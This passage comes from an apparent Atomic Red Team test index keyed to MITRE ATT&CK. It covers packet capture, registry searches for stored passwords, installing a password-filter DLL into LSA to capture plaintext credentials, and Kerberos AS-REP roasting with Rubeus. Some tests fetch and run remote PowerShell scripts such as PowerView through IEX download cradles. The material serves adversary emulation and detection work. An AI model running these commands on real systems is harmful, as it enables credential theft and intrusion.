      - description: 'Check if at least one of tcpdump or tshark is installed.

          '
        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
          -v tshark)" ]; then exit 1; else exit 0; fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
      executor:
        command: |
          tcpdump -c 5 -nnni #{interface}
          tshark -c 5 -i #{interface}
        name: bash
        elevation_required: true
    - name: Packet Capture macOS using tcpdump or tshark
      auto_generated_guid: 9d04efee-eff5-4240-b8d2-07792b873608
      description: |
        Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.

        Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.
      supported_platforms:
      - macos
      input_arguments:
        interface:
          description: Specify interface to perform PCAP on.
          type: string
          default: en0A
      dependency_executor_name: bash
      dependencies:
      - description: 'Check if at least one of tcpdump or tshark is installed.

          '
        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
          -v tshark)" ]; then exit 1; else exit 0; fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
      executor:
        command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
          tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n"
        name: bash
        elevation_required: true
    - name: Packet Capture Windows Command Prompt
      auto_generated_guid: a5b2f6a0-24b4-493e-9590-c699f75723ca
      description: |
        Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark
        installed.

        Upon successful execution, tshark will execute and capture 5 packets on interface "Ethernet".
      supported_platforms:
      - windows
      input_arguments:
        interface:
          description: Specify interface to perform PCAP on.
          type: string
          default: Ethernet
        wireshark_url:
          description: wireshark installer download URL
          type: url
          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-latest.exe
        tshark_path:
          description: path to tshark.exe
          type: path
          default: c:\program files\wireshark\tshark.exe
        npcap_url:
          description: npcap installed download URL
          type: url
          default: https://nmap.org/npcap/dist/npcap-1.31.exe
        npcap_path:
          description: path to npcap.sys
          type: path
          default: C:\Program Files\Npcap\npcap.sys
      dependency_executor_name: powershell
      dependencies:
      - description: 'tshark must be installed and in the default path of "c:\Program
          Files\Wireshark\Tshark.exe".

          '
        prereq_command: if (test-path "#{tshark_path}") {exit 0} else {exit 1}
        get_prereq_command: |
          Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
          Start-Process $env:temp\wireshark_installer.exe /S
      - description: 'npcap must be installed.

          '
        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
        get_prereq_command: |
          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
          Start-Process $env:temp\npcap_installer.exe
      executor:
        command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5

          '
        name: command_prompt
        elevation_required: true
    - name: Windows Internal Packet Capture
      auto_generated_guid: b5656f67-d67f-4de8-8e62-b5581630f528
      description: |-
        Uses the built-in Windows packet capture
        After execution you should find a file named trace.etl and trace.cab in the temp directory
      supported_platforms:
      - windows
      executor:
        command: netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
        cleanup_command: |-
          netsh trace stop >nul 2>&1
          TIMEOUT /T 5 >nul 2>&1
          del %temp%\trace.etl >nul 2>&1
          del %temp%\trace.cab >nul 2>&1
        name: command_prompt
        elevation_required: true
    - name: Windows Internal pktmon capture
      auto_generated_guid: c67ba807-f48b-446e-b955-e4928cd1bf91
      description: |-
        Will start a packet capture and store log file as t1040.etl.
        https://lolbas-project.github.io/lolbas/Binaries/Pktmon/
      supported_platforms:
      - windows
      executor:
        command: |
          pktmon.exe start --etw  -f %TEMP%\t1040.etl
          TIMEOUT /T 5 >nul 2>&1
          pktmon.exe stop
        cleanup_command: del %TEMP%\t1040.etl
        name: command_prompt
        elevation_required: true
    - name: Windows Internal pktmon set filter
      auto_generated_guid: 855fb8b4-b8ab-4785-ae77-09f5df7bff55
      description: "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/"
      supported_platforms:
      - windows
      executor:
        command: 'pktmon.exe filter add -p 445

          '
        cleanup_command: pktmon filter remove
        name: command_prompt
        elevation_required: true
    - name: Packet Capture macOS using /dev/bpfN with sudo
      auto_generated_guid: e6fe5095-545d-4c8b-a0ae-e863914be3aa
      description: 'Opens a /dev/bpf file (O_RDONLY) and captures packets for a few
        seconds.

        '
      supported_platforms:
      - macos
      input_arguments:
        ifname:
          description: Specify interface to perform PCAP on.
          type: string
          default: en0
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/macos_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_macos_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'exit 1

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -i #{ifname} -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Filtered Packet Capture macOS using /dev/bpfN with sudo
      auto_generated_guid: e2480aee-23f3-4f34-80ce-de221e27cd19
      description: 'Opens a /dev/bpf file (O_RDONLY), sets BPF filter for ''udp''
        and captures packets for a few seconds.

        '
      supported_platforms:
      - macos
      input_arguments:
        ifname:
          description: Specify interface to perform PCAP on.
          type: string
          default: en0
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/macos_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_macos_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'exit 1

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -f -i #{ifname} -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo
      auto_generated_guid: 10c710c9-9104-4d5f-8829-5b65391e2a29
      description: 'Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few
        seconds.

        '
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -a -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo
      auto_generated_guid: 7a0895f0-84c1-4adf-8491-a21510b1d4c1
      description: 'Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP
        for a few seconds.

        '
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -4 -p 6 -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo
      auto_generated_guid: 515575ab-d213-42b1-aa64-ef6a2dd4641b
      description: |
        Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.
        SOCK_PACKET is "obsolete" according to the man page, but still works on Ubuntu 20.04
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -4 -P -p 17 -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP
        with sudo
      auto_generated_guid: b1cbdf8b-6078-48f5-a890-11ea19d7f8e9
      description: |
        Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.
        Sets a BPF filter on the socket to filter for UDP traffic.
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -a -f -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
  T1552.002:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Sudhanshu Chauhan, @Sudhanshu_C
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580
      type: attack-pattern
      created: '2020-02-04T12:58:40.678Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1552.002
        url: https://attack.mitre.org/techniques/T1552/002
      - url: https://pentestlab.blog/2017/04/19/stored-credentials/
        description: netbiosX. (2017, April 19). Stored Credentials. Retrieved April
          6, 2018.
        source_name: Pentestlab Stored Credentials
      modified: '2020-02-07T20:49:18.834Z'
      name: 'Unsecured Credentials: Credentials in Registry'
      description: |-
        Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

        Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

        * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
        * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor processes for applications that can be used to query
        the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and
        collect command parameters that may indicate credentials are being searched.
        Correlate activity with related suspicious behavior that may indicate an active
        intrusion to reduce false positives.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Windows Registry: Windows Registry Key Access'
      x_mitre_permissions_required:
      - Administrator
      - User
      x_mitre_system_requirements:
      - Ability to query some Registry locations depends on the adversary's level
        of access. User permissions are usually limited to access of user-related
        Registry keys.
      identifier: T1552.002
    atomic_tests:
    - name: Enumeration for Credentials in Registry
      auto_generated_guid: b6ec082c-7384-46b3-a111-9a9b8b14e5e7
      description: 'Queries to enumerate for credentials in the Registry. Upon execution,
        any registry key containing the word "password" will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          reg query HKLM /f password /t REG_SZ /s
          reg query HKCU /f password /t REG_SZ /s
        name: command_prompt
    - name: Enumeration for PuTTY Credentials in Registry
      auto_generated_guid: af197fd7-e868-448e-9bd5-05d1bcd9d9e5
      description: |
        Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry
        entries are found, they will be displayed.
      supported_platforms:
      - windows
      executor:
        command: 'reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s

          '
        name: command_prompt
  T1556.002:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Vincent Le Toux
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42
      type: attack-pattern
      created: '2020-02-11T19:05:45.829Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1556.002
        url: https://attack.mitre.org/techniques/T1556/002
      - url: http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
        description: Fuller, R. (2013, September 11). Stealing passwords every time
          they change. Retrieved November 21, 2017.
        source_name: Carnal Ownage Password Filters Sept 2013
      - url: https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/
        description: Bialek, J. (2013, September 15). Intercepting Password Changes
          With Function Hooking. Retrieved November 21, 2017.
        source_name: Clymb3r Function Hook Passwords Sept 2013
      modified: '2021-04-20T20:11:55.147Z'
      name: 'Modify Authentication Process: Password Filter DLL'
      description: "Adversaries may register malicious password filter dynamic link
        libraries (DLLs) into the authentication process to acquire user credentials
        as they are validated. \n\nWindows password filters are password policy enforcement
        mechanisms for both domain and local accounts. Filters are implemented as
        DLLs containing a method to validate potential passwords against password
        policies. Filter DLLs can be positioned on local computers for local accounts
        and/or domain controllers for domain accounts. Before registering new passwords
        in the Security Accounts Manager (SAM), the Local Security Authority (LSA)
        requests validation from each registered filter. Any potential changes cannot
        take effect until every registered filter acknowledges validation. \n\nAdversaries
        can register malicious password filters to harvest credentials from local
        computers and/or entire domains. To perform proper validation, filters must
        receive plain-text credentials from the LSA. A malicious password filter would
        receive these plain-text credentials every time a password request is made.(Citation:
        Carnal Ownage Password Filters Sept 2013)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: |-
        Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>) and correlate then investigate the DLL files these files reference.

        Password filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)
      x_mitre_is_subtechnique: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Module: Module Load'
      - 'File: File Creation'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      identifier: T1556.002
    atomic_tests:
    - name: Install and Register Password Filter DLL
      auto_generated_guid: a7961770-beb5-4134-9674-83d7e1fa865c
      description: "Uses PowerShell to install and register a password filter DLL.
        Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource
        is in src folder. \nThis does require a reboot to see the filter loaded into
        lsass.exe. \nIt does require Administrative privileges to import the clean
        registry values back into LSA, it is possible you may have to manually do
        this after for cleanup.\n"
      supported_platforms:
      - windows
      input_arguments:
        dll_path:
          description: Path to DLL to be installed and registered
          type: path
          default: PathToAtomicsFolder\T1556.002\bin
        dll_name:
          description: Name of the Password Filter
          type: string
          default: AtomicRedTeamPWFilter.dll
      dependency_executor_name: powershell
      dependencies:
      - description: 'AtomicRedTeamPWFilter.dll must exist on disk at specified location
          (#{dll_path}\#{dll_name})

          '
        prereq_command: 'if (Test-Path #{dll_path}\#{dll_name}) {exit 0} else {exit
          1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll" -OutFile "#{dll_path}\#{dll_name}"
      executor:
        command: |
          reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ PathToAtomicsFolder\T1556.002\lsa_backup.reg
          $passwordFilterName = (Copy-Item "#{dll_path}\#{dll_name}" -Destination "C:\Windows\System32" -PassThru).basename
          $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
          $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
          $notificationPackagesValues += $passwordFilterName
          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
        cleanup_command: |
          reg.exe import PathToAtomicsFolder\T1556.002\lsa_backup.reg
          remove-item C:\Windows\System32\#{dll_name}
        name: powershell
        elevation_required: true
  T1558.004:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Yossi Nisani, Cymptom
      - James Dunn, @jamdunnDFW, EY
      - Swapnil Kumbhar
      - Jacques Pluviose, @Jacqueswildy_IT
      - Dan Nutting, @KerberToast
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b
      type: attack-pattern
      created: '2020-08-24T13:43:00.028Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1558.004
        url: https://attack.mitre.org/techniques/T1558/004
      - source_name: Harmj0y Roasting AS-REPs Jan 2017
        url: http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
        description: HarmJ0y. (2017, January 17). Roasting AS-REPs. Retrieved August
          24, 2020.
      - source_name: Microsoft Kerberos Preauth 2014
        url: https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx
        description: 'Sanyal, M.. (2014, March 18). Kerberos Pre-Authentication: Why
          It Should Not Be Disabled. Retrieved August 25, 2020.'
      - source_name: Stealthbits Cracking AS-REP Roasting Jun 2019
        url: https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/
        description: Jeff Warren. (2019, June 27). Cracking Active Directory Passwords
          with AS-REP Roasting. Retrieved August 24, 2020.
      - description: Medin, T. (2014, November). Attacking Kerberos - Kicking the
          Guard Dog of Hades. Retrieved March 22, 2018.
        source_name: SANS Attacking Kerberos Nov 2014
        url: https://redsiege.com/kerberoast-slides
      - url: https://adsecurity.org/?p=2293
        description: Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets
          Using Kerberoast ‚Äì Exploiting Kerberos to Compromise the Active Directory
          Domain. Retrieved March 22, 2018.
        source_name: AdSecurity Cracking Kerberos Dec 2015
      - url: https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/
        description: Bani, M. (2018, February 23). Detecting Kerberoasting activity
          using Azure Security Center. Retrieved March 23, 2018.
        source_name: Microsoft Detecting Kerberoasting Feb 2018
      - source_name: Microsoft 4768 TGT 2017
        url: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768
        description: 'Microsoft. (2017, April 19). 4768(S, F): A Kerberos authentication
          ticket (TGT) was requested. Retrieved August 24, 2020.'
      modified: '2021-06-07T19:23:33.039Z'
      name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
      description: "Adversaries may reveal credentials of accounts that have disabled
        Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002)
        Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication
        offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002).
        When enabled, a user requesting access to a resource initiates communication
        with the Domain Controller (DC) by sending an Authentication Server Request
        (AS-REQ) message with a timestamp that is encrypted with the hash of their
        password. If and only if the DC is able to successfully decrypt the timestamp
        with the hash of the user‚Äôs password, it will then send an Authentication
        Server Response (AS-REP) message that contains the Ticket Granting Ticket
        (TGT) to the user. Part of the AS-REP message is signed with the user‚Äôs password.(Citation:
        Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication,
        an adversary may send an AS-REQ message without the encrypted timestamp and
        receive an AS-REP message with TGT data which may be encrypted with an insecure
        algorithm such as RC4. The recovered encrypted data may be vulnerable to offline
        [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks
        similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)
        and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan
        2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account
        registered to a domain, with or without special privileges, can be abused
        to list all domain accounts that have preauthentication disabled by utilizing
        Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001)
        with an LDAP filter. Alternatively, the adversary may send an AS-REQ message
        for each user. If the DC responds without errors, the account does not require
        preauthentication and the AS-REP message will already contain the encrypted
        data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits
        Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003),
        [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral
        Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:
        SANS Attacking Kerberos Nov 2014)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'Enable Audit Kerberos Service Ticket Operations to log Kerberos
        TGS service ticket requests. Particularly investigate irregular patterns of
        activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within
        a small time frame, especially if they also request RC4 encryption [Type 0x17],
        pre-authentication not required [Type: 0x0]).(Citation: AdSecurity Cracking
        Kerberos Dec 2015)(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation:
        Microsoft 4768 TGT 2017)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Active Directory: Active Directory Credential Request'
      x_mitre_permissions_required:
      - User
      x_mitre_system_requirements:
      - Valid domain account
      identifier: T1558.004
    atomic_tests:
    - name: Rubeus asreproast
      auto_generated_guid: 615bd568-2859-41b5-9aed-61f6a88e48dd
      description: |
        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
      supported_platforms:
      - windows
      input_arguments:
        local_folder:
          description: Local path of Rubeus executable
          type: path
          default: "$Env:temp"
        local_executable:
          description: name of the rubeus executable
          type: string
          default: rubeus.exe
        out_file:
          description: file where command results are stored
          type: string
          default: rubeus_output.txt
        rubeus_url:
          description: URL of Rubeus executable
          type: url
          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      - description: 'Rubeus must exist

          '
        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}

          '
      executor:
        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"

          '
        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore

          '
        name: powershell
        elevation_required: false
    - name: Get-DomainUser with PowerView
      auto_generated_guid: d6139549-7b72-4e48-9ea1-324fc9bdf88a
      description: 'Utilizing PowerView, run Get-DomainUser to identify domain users.
        Upon execution, progress and info about users within the domain being scanned
        will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
        name: powershell
    - name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
      auto_generated_guid: 8c385f88-4d47-4c9a-814d-93d9deec8c71
      description: PowerSharpPack - Kerberoasting Using Rubeus technique via function
        of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
          Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
        name: powershell
  T1558:
    technique:
      modified: '2023-03-30T21:01:50.214Z'
      name: Steal or Forge Kerberos Tickets
      description: |
        Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as ‚Äúrealms‚Ä?, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.

        On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)

        Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the "ccache". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)


        Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Tim (Wadhwa-)Brown
      - Cody Thomas, SpecterOps
      x_mitre_detection: "Monitor for anomalous Kerberos activity, such as malformed
        or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634),
        RC4 encryption within ticket granting tickets (TGTs), and ticket granting
        service (TGS) requests without preceding TGT requests.(Citation: ADSecurity
        Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation:
        CERT-EU Golden Ticket Protection)\n\nMonitor the lifetime of TGT tickets for
        values that differ from the default domain duration.(Citation: Microsoft Kerberos
        Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)
        being used to move laterally. \n\nEnable Audit Kerberos Service Ticket Operations
        to log Kerberos TGS service ticket requests. Particularly investigate irregular
        patterns of activity (ex: accounts making numerous requests, Event ID 4769,
        within a small time frame, especially if they also request RC4 encryption
        [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation:
        AdSecurity Cracking Kerberos Dec 2015)\n\nMonitor for unexpected processes
        interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords
        from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002)
        access the LSA Subsystem Service (LSASS) process by opening the process, locating
        the LSA secrets key, and decrypting the sections in memory where credential
        details, including Kerberos tickets, are stored.\n\nMonitor for unusual processes
        accessing¬†<code>secrets.ldb</code> and <code>.secrets.mkey</code> located
        in <code>/var/lib/sss/secrets/</code>."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Active Directory: Active Directory Credential Request'
